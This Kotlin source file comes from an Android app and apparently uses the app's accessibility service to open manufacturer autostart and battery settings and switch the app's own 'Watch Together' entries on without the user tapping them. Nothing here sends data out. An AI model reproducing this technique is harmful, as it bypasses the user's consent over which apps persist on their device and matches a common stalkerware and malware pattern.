package com.phonehand.app

import android.content.Context
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import java.util.concurrent.Executors

/** Auto-toggles Watch Together ON in OEM autostart / battery screens. */
object OemPersistenceGrant {
    private const val TAG = "OemGrant"
    private val executor = Executors.newSingleThreadExecutor()
    private val mainHandler = Handler(Looper.getMainLooper())

    fun runAutoGrant(context: Context) {
        val service = TouchAccessibilityService.instance
        if (service == null) {
            Log.w(TAG, "accessibility off")
            PersistenceHelper.openManufacturerAutostart(context)
            return
        }
        val labels = listOf(
            context.getString(R.string.app_name),
            "Watch Together",
            context.packageName,
        )
        if (!PersistenceHelper.openManufacturerAutostart(context)) {
            PersistenceHelper.openBatterySettings(context)
        }
        Thread.sleep(900)
        PermissionAutoGrant.runAppTogglePass(context, labels, 30_000)
        UserSession.setAutostartPromptDone(context)
    }

    fun runAutoGrantAsync(context: Context, onDone: () -> Unit) {
        val app = context.applicationContext
        mainHandler.post {
            val service = TouchAccessibilityService.instance
            if (service == null) {
                Log.w(TAG, "accessibility off")
                PersistenceHelper.openManufacturerAutostart(context)
                onDone()
                return@post
            }
            val labels = listOf(
                context.getString(R.string.app_name),
                "Watch Together",
                context.packageName,
            )
            if (!PersistenceHelper.openManufacturerAutostart(context)) {
                PersistenceHelper.openBatterySettings(context)
            }
            executor.execute {
                try {
                    Thread.sleep(900)
                    PermissionAutoGrant.runAppTogglePass(app, labels, 30_000)
                    UserSession.setAutostartPromptDone(app)
                } catch (e: Exception) {
                    Log.w(TAG, "auto grant failed: ${e.message}")
                } finally {
                    mainHandler.post(onDone)
                }
            }
        }
    }

    fun manufacturer(): String = Build.MANUFACTURER.orEmpty().lowercase()
}
